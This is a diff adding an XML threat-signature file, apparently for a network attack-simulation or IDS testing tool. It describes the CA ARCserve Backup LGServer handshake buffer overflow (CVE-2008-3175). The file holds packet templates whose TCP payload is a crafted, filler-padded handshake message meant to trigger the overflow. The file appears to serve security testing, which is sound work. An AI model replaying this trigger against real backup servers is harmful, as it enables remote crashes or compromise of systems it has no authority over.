@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CA ARCserve Backup for Laptops and Desktops LGServer Handshake Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in the way CA ARCserve Backup for Laptops and Desktops service handles incoming messages. A remote unauthenticated attacker can send specially crafted message to the LGServer service to trigger the vulnerability, potentially execute arbitrary code on the target host with System privileges."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="SSDP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CA"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CA_CA_ARCserve_Backup_for_Laptops_and_Desktops"/>
+      <item value="CA_CA_Desktop_Management_Suite"/>
+      <item value="CA_CA_CA_Protection_Suites"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.5"/>
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.1"/>
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.1_SP1"/>
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.1_SP2"/>
+      <item value="CA_ARCserve_Backup_for_Laptops_and_Desktops_r11.0"/>
+      <item value="CA_Desktop_Management_Suite_11.2"/>
+      <item value="CA_Desktop_Management_Suite_11.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20080731-12"/>
+    <CVEID display="true" value="CVE-2008-3175"/>
+    <bugtraqID display="true" value="30472"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="61ea5d90a5a511dd88fc000c29da7492"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633607140342656250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1225169839" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="O"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="P"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="Q"/>
+    <NamedVar name="SSDPdestPort" type="ImperfectControls.Port" value="null" index="R"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="D"/>
+    <for index="A">
+      <for index="E"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="F">
+      <for index="E"/>
+      <for index="O"/>
+      <for index="P"/>
+      <for index="Q"/>
+      <for index="R"/>
+    </for>
+    <for index="G"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0070" Identification="29B2" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="AF0E" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$SSDPdestPort" SeqNumber="A9778E5C" AckNumber="DADCBF0B" HeaderLength="08" WindowSize="002E" Checksum="44FA" UrgentPointer="0000" Options="0101080AF19BA80F000B7ABA" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="F" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0070" Identification="29B2" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="AF0E" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$SSDPdestPort" SeqNumber="A9778E5C" AckNumber="DADCBF0B" HeaderLength="08" WindowSize="002E" Checksum="44FA" UrgentPointer="0000" Options="0101080AF19BA80F000B7ABA" Payload="303030303030303035304646414141414141414141414141414130314141414141414141414141414141303142424242424242424242424242424630" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3">
+    <Output index="D" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0060" Identification="4CEB" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4BE5" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="DADCBEDF" AckNumber="A9778E5C" HeaderLength="08" WindowSize="FAF0" Checksum="E2DF" UrgentPointer="0000" Options="0101080A000B7ABAF19BA7FA" Payload="3030303030303030333437383045303931334638303543453839383339413946423231444134363837343037" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="G" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0060" Identification="4CEB" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="4BE5" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="DADCBEDF" AckNumber="A9778E5C" HeaderLength="08" WindowSize="FAF0" Checksum="E2DF" UrgentPointer="0000" Options="0101080A000B7ABAF19BA7FA" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
